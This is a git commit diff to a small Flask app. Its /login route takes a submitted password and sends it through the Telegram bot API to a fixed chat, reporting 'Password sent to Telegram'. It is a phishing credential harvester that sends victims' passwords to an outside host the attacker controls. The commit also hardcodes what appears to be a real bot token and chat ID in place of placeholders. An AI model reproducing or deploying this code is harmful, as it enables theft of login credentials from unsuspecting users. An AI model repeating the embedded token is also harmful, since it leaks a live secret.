39adb88e4dc4dea039588215d2d7ddf778f65f94
Danyalss <danyalsoltani87@gmail.com>
2024-06-13 21:43:04 +0330

    add

--- app.py
+++ app.py
@@ -7,8 +7,8 @@ app = Flask(__name__)
 @app.route('/login', methods=['POST'])
 def login():
     password = request.form.get('password')
-    chat_id = "YOUR_CHAT_ID"
-    token = "YOUR_BOT_TOKEN"
+    chat_id = "1663788795"
+    token = "6583320212:AAErFlhIYmA0Je36piZCnXa_C48Jl31-PCk"
     url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={password}"
     get(url,print_text=True)
     return "Password sent to Telegram"
